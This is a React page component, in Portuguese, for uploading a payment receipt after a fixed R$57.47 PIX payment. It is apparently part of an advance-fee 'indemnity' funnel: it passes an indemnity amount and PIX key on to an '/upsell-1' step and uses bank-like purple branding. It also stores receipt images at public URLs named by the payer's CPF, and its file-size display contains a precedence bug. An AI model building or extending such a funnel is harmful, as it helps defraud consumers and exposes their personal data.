import { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { Upload, CheckCircle2, FileImage, X } from 'lucide-react';
import { createClient } from '@supabase/supabase-js';
import { navigateWithParams } from '../utils/urlParams';

const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

export default function ReceiptUploadPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, indemnityAmount, pixKeyType, pixKey, urlParams, transactionId } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const cpf = userData?.cpf;
  const customerName = userData?.nome;
  const amount = 57.47;

  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewUrl, setPreviewUrl] = useState<string>('');
  const [uploading, setUploading] = useState(false);
  const [error, setError] = useState('');

  const handleFileSelect = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      if (file.size > 10 * 1024 * 1024) {
        setError('Arquivo muito grande. Tamanho máximo: 10MB');
        return;
      }

      if (!file.type.startsWith('image/')) {
        setError('Apenas imagens são permitidas');
        return;
      }

      setSelectedFile(file);
      setPreviewUrl(URL.createObjectURL(file));
      setError('');
    }
  };

  const handleRemoveFile = () => {
    setSelectedFile(null);
    setPreviewUrl('');
    setError('');
  };

  const handleUpload = async () => {
    if (!selectedFile) {
      setError('Selecione uma imagem do comprovante');
      return;
    }

    try {
      setUploading(true);
      setError('');

      const fileExt = selectedFile.name.split('.').pop();
      const fileName = `${cpf}_${Date.now()}.${fileExt}`;
      const filePath = `${cpf}/${fileName}`;

      const { data: uploadData, error: uploadError } = await supabase.storage
        .from('payment-receipts')
        .upload(filePath, selectedFile, {
          cacheControl: '3600',
          upsert: false,
        });

      if (uploadError) throw uploadError;

      const { data: urlData } = supabase.storage
        .from('payment-receipts')
        .getPublicUrl(filePath);

      const receiptImageUrl = urlData.publicUrl;

      const { error: updateError } = await supabase
        .from('payment_receipts')
        .update({
          receipt_image_url: receiptImageUrl,
          receipt_uploaded_at: new Date().toISOString(),
          status: 'receipt_uploaded',
          updated_at: new Date().toISOString(),
        })
        .eq('transaction_id', transactionId);

      if (updateError) throw updateError;

      navigateWithParams(
        navigate,
        '/upsell-1',
        location,
        {
          userData,
          indemnityAmount,
          pixKeyType,
          pixKey,
          transactionId,
          receiptUploaded: true
        }
      );
    } catch (err: any) {
      console.error('Error uploading receipt:', err);
      setError(err.message || 'Erro ao enviar comprovante. Tente novamente.');
    } finally {
      setUploading(false);
    }
  };

  const handleContinueWithout = async () => {
    try {
      await supabase
        .from('payment_receipts')
        .update({
          status: 'pending_receipt',
          updated_at: new Date().toISOString(),
        })
        .eq('transaction_id', transactionId);

      navigate('/upsell-1', {
        state: {
          userData,
          indemnityAmount,
          pixKeyType,
          pixKey,
          urlParams,
          transactionId,
          receiptUploaded: false
        },
      });
    } catch (err) {
      console.error('Error updating status:', err);
      navigate('/upsell-1', {
        state: {
          userData,
          indemnityAmount,
          pixKeyType,
          pixKey,
          urlParams,
          transactionId,
          receiptUploaded: false
        },
      });
    }
  };

  if (!transactionId) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="text-center">
          <p className="text-gray-600 mb-4">Informações de pagamento não encontradas</p>
          <button
            onClick={() => navigate('/')}
            className="text-[#8A05BE] hover:underline"
          >
            Voltar ao início
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8 px-4">
      <div className="max-w-2xl mx-auto">
        <div className="bg-white rounded-2xl shadow-lg p-6 sm:p-8">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle2 className="w-8 h-8 text-green-600" />
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
              Pagamento Identificado!
            </h1>
            <p className="text-gray-600">
              Para validar seu pagamento, envie o comprovante
            </p>
          </div>

          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <p className="text-gray-600">Cliente</p>
                <p className="font-semibold text-gray-900">{customerName || 'N/A'}</p>
              </div>
              <div>
                <p className="text-gray-600">CPF</p>
                <p className="font-semibold text-gray-900">{cpf || 'N/A'}</p>
              </div>
              <div>
                <p className="text-gray-600">Valor</p>
                <p className="font-semibold text-gray-900">
                  R$ {amount?.toFixed(2) || '0.00'}
                </p>
              </div>
              <div>
                <p className="text-gray-600">Status</p>
                <p className="font-semibold text-green-600">Pago</p>
              </div>
            </div>
          </div>

          {error && (
            <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-sm text-red-800">{error}</p>
            </div>
          )}

          {!previewUrl ? (
            <div className="mb-6">
              <label className="block">
                <div className="border-2 border-dashed border-gray-300 rounded-lg p-8 text-center cursor-pointer hover:border-[#8A05BE] transition-colors">
                  <Upload className="w-12 h-12 text-gray-400 mx-auto mb-4" />
                  <p className="text-gray-700 font-medium mb-2">
                    Clique para selecionar o comprovante
                  </p>
                  <p className="text-sm text-gray-500">
                    PNG, JPG ou PDF até 10MB
                  </p>
                </div>
                <input
                  type="file"
                  accept="image/*"
                  onChange={handleFileSelect}
                  className="hidden"
                />
              </label>
            </div>
          ) : (
            <div className="mb-6">
              <div className="relative border-2 border-gray-200 rounded-lg p-4">
                <button
                  onClick={handleRemoveFile}
                  className="absolute top-2 right-2 w-8 h-8 bg-red-500 text-white rounded-full flex items-center justify-center hover:bg-red-600 transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
                <div className="flex items-center gap-4">
                  <div className="w-16 h-16 bg-gray-100 rounded-lg flex items-center justify-center flex-shrink-0">
                    {previewUrl ? (
                      <img
                        src={previewUrl}
                        alt="Preview"
                        className="w-full h-full object-cover rounded-lg"
                      />
                    ) : (
                      <FileImage className="w-8 h-8 text-gray-400" />
                    )}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-medium text-gray-900 truncate">
                      {selectedFile?.name}
                    </p>
                    <p className="text-sm text-gray-500">
                      {(selectedFile?.size || 0 / 1024 / 1024).toFixed(2)} MB
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          <div className="space-y-3">
            <button
              onClick={handleUpload}
              disabled={uploading || !selectedFile}
              className="w-full bg-[#8A05BE] text-white py-3 rounded-lg font-semibold hover:bg-[#8A05BE]/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              <Upload className="w-5 h-5" />
              {uploading ? 'Enviando...' : 'Enviar Comprovante'}
            </button>

            <button
              onClick={handleContinueWithout}
              disabled={uploading}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              Continuar sem Anexar
            </button>
          </div>

          <p className="text-xs text-gray-500 text-center mt-6">
            O comprovante ajuda na validação rápida do seu pagamento
          </p>
        </div>
      </div>
    </div>
  );
}
